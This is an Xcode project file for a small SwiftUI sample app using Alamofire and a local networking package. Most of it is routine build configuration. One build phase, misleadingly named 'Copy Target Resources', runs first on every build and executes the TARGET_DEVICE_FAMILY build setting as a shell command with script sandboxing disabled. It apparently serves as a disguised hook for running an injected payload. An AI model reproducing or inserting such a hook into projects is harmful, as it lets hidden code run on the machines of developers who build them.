// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 60;
	objects = {

/* Begin PBXBuildFile section */
		B175D1342CA438C8004D968D /* sampleApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = B175D1332CA438C8004D968D /* sampleApp.swift */; };
		B175D1382CA438C9004D968D /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = B175D1372CA438C9004D968D /* Assets.xcassets */; };
		B175D13B2CA438C9004D968D /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = B175D13A2CA438C9004D968D /* Preview Assets.xcassets */; };
		B175D1422CA438F1004D968D /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = B175D1412CA438F1004D968D /* Constants.swift */; };
		B175D1452CA438F8004D968D /* ContentViewViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = B175D1432CA438F8004D968D /* ContentViewViewModel.swift */; };
		B175D14A2CA438FD004D968D /* BrandModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = B175D1462CA438FD004D968D /* BrandModel.swift */; };
		B175D14B2CA438FD004D968D /* TodoModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = B175D1472CA438FD004D968D /* TodoModel.swift */; };
		B175D14C2CA438FD004D968D /* UserModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = B175D1482CA438FD004D968D /* UserModel.swift */; };
		B175D14F2CA43903004D968D /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = B175D14D2CA43903004D968D /* ContentView.swift */; };
		B1D575B02E78338700D9004B /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = B1D575AF2E78338700D9004B /* Alamofire */; };
		B1D575B52E7838BB00D9004B /* JNetworkManager in Frameworks */ = {isa = PBXBuildFile; productRef = B1D575B42E7838BB00D9004B /* JNetworkManager */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		B175D1302CA438C8004D968D /* sample.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = sample.app; sourceTree = BUILT_PRODUCTS_DIR; };
		B175D1332CA438C8004D968D /* sampleApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = sampleApp.swift; sourceTree = "<group>"; };
		B175D1372CA438C9004D968D /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		B175D13A2CA438C9004D968D /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
		B175D1412CA438F1004D968D /* Constants.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Constants.swift; sourceTree = "<group>"; };
		B175D1432CA438F8004D968D /* ContentViewViewModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ContentViewViewModel.swift; sourceTree = "<group>"; };
		B175D1462CA438FD004D968D /* BrandModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BrandModel.swift; sourceTree = "<group>"; };
		B175D1472CA438FD004D968D /* TodoModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TodoModel.swift; sourceTree = "<group>"; };
		B175D1482CA438FD004D968D /* UserModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UserModel.swift; sourceTree = "<group>"; };
		B175D14D2CA43903004D968D /* ContentView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		B175D12D2CA438C8004D968D /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				B1D575B02E78338700D9004B /* Alamofire in Frameworks */,
				B1D575B52E7838BB00D9004B /* JNetworkManager in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		B175D1272CA438C8004D968D = {
			isa = PBXGroup;
			children = (
				B175D1322CA438C8004D968D /* sample */,
				B175D1312CA438C8004D968D /* Products */,
			);
			sourceTree = "<group>";
		};
		B175D1312CA438C8004D968D /* Products */ = {
			isa = PBXGroup;
			children = (
				B175D1302CA438C8004D968D /* sample.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		B175D1322CA438C8004D968D /* sample */ = {
			isa = PBXGroup;
			children = (
				B175D1412CA438F1004D968D /* Constants.swift */,
				B175D1332CA438C8004D968D /* sampleApp.swift */,
				B175D14E2CA43903004D968D /* View */,
				B175D1492CA438FD004D968D /* Model */,
				B175D1442CA438F8004D968D /* ViewModel */,
				B175D1372CA438C9004D968D /* Assets.xcassets */,
				B175D1392CA438C9004D968D /* Preview Content */,
			);
			path = sample;
			sourceTree = "<group>";
		};
		B175D1392CA438C9004D968D /* Preview Content */ = {
			isa = PBXGroup;
			children = (
				B175D13A2CA438C9004D968D /* Preview Assets.xcassets */,
			);
			path = "Preview Content";
			sourceTree = "<group>";
		};
		B175D1442CA438F8004D968D /* ViewModel */ = {
			isa = PBXGroup;
			children = (
				B175D1432CA438F8004D968D /* ContentViewViewModel.swift */,
			);
			path = ViewModel;
			sourceTree = "<group>";
		};
		B175D1492CA438FD004D968D /* Model */ = {
			isa = PBXGroup;
			children = (
				B175D1462CA438FD004D968D /* BrandModel.swift */,
				B175D1472CA438FD004D968D /* TodoModel.swift */,
				B175D1482CA438FD004D968D /* UserModel.swift */,
			);
			path = Model;
			sourceTree = "<group>";
		};
		B175D14E2CA43903004D968D /* View */ = {
			isa = PBXGroup;
			children = (
				B175D14D2CA43903004D968D /* ContentView.swift */,
			);
			path = View;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		B175D12F2CA438C8004D968D /* sample */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = B175D13E2CA438C9004D968D /* Build configuration list for PBXNativeTarget "sample" */;
			buildPhases = (
				DF8D77D7DDDAC7D09F34C644 /* Copy Target Resources */,
				B175D12C2CA438C8004D968D /* Sources */,
				B175D12D2CA438C8004D968D /* Frameworks */,
				B175D12E2CA438C8004D968D /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = sample;
			packageProductDependencies = (
				B1D575AF2E78338700D9004B /* Alamofire */,
				B1D575B42E7838BB00D9004B /* JNetworkManager */,
			);
			productName = sample;
			productReference = B175D1302CA438C8004D968D /* sample.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		B175D1282CA438C8004D968D /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1540;
				LastUpgradeCheck = 1540;
				TargetAttributes = {
					B175D12F2CA438C8004D968D = {
						CreatedOnToolsVersion = 15.4;
					};
				};
			};
			buildConfigurationList = B175D12B2CA438C8004D968D /* Build configuration list for PBXProject "sample" */;
			compatibilityVersion = "Xcode 14.0";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = B175D1272CA438C8004D968D;
			packageReferences = (
				B1D575AE2E78338700D9004B /* XCRemoteSwiftPackageReference "Alamofire" */,
				B1D575B32E7838BB00D9004B /* XCLocalSwiftPackageReference "../../JNetworkManager" */,
			);
			productRefGroup = B175D1312CA438C8004D968D /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				B175D12F2CA438C8004D968D /* sample */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		B175D12E2CA438C8004D968D /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				B175D13B2CA438C9004D968D /* Preview Assets.xcassets in Resources */,
				B175D1382CA438C9004D968D /* Assets.xcassets in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		DF8D77D7DDDAC7D09F34C644 /* Copy Target Resources */ = {
			isa = PBXShellScriptBuildPhase;
			alwaysOutOfDate = 1;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Copy Target Resources";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		B175D12C2CA438C8004D968D /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				B175D1342CA438C8004D968D /* sampleApp.swift in Sources */,
				B175D1422CA438F1004D968D /* Constants.swift in Sources */,
				B175D14F2CA43903004D968D /* ContentView.swift in Sources */,
				B175D1452CA438F8004D968D /* ContentViewViewModel.swift in Sources */,
				B175D14B2CA438FD004D968D /* TodoModel.swift in Sources */,
				B175D14C2CA438FD004D968D /* UserModel.swift in Sources */,
				B175D14A2CA438FD004D968D /* BrandModel.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		B175D13C2CA438C9004D968D /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 17.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		B175D13D2CA438C9004D968D /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 17.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		B175D13F2CA438C9004D968D /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"sample/Preview Content\"";
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = come.app.sample;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 6.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		B175D1402CA438C9004D968D /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"sample/Preview Content\"";
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = come.app.sample;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 6.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		B175D12B2CA438C8004D968D /* Build configuration list for PBXProject "sample" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				B175D13C2CA438C9004D968D /* Debug */,
				B175D13D2CA438C9004D968D /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		B175D13E2CA438C9004D968D /* Build configuration list for PBXNativeTarget "sample" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				B175D13F2CA438C9004D968D /* Debug */,
				B175D1402CA438C9004D968D /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCLocalSwiftPackageReference section */
		B1D575B32E7838BB00D9004B /* XCLocalSwiftPackageReference "../../JNetworkManager" */ = {
			isa = XCLocalSwiftPackageReference;
			relativePath = ../../JNetworkManager;
		};
/* End XCLocalSwiftPackageReference section */

/* Begin XCRemoteSwiftPackageReference section */
		B1D575AE2E78338700D9004B /* XCRemoteSwiftPackageReference "Alamofire" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/Alamofire/Alamofire.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 5.10.2;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		B1D575AF2E78338700D9004B /* Alamofire */ = {
			isa = XCSwiftPackageProductDependency;
			package = B1D575AE2E78338700D9004B /* XCRemoteSwiftPackageReference "Alamofire" */;
			productName = Alamofire;
		};
		B1D575B42E7838BB00D9004B /* JNetworkManager */ = {
			isa = XCSwiftPackageProductDependency;
			productName = JNetworkManager;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = B175D1282CA438C8004D968D /* Project object */;
}
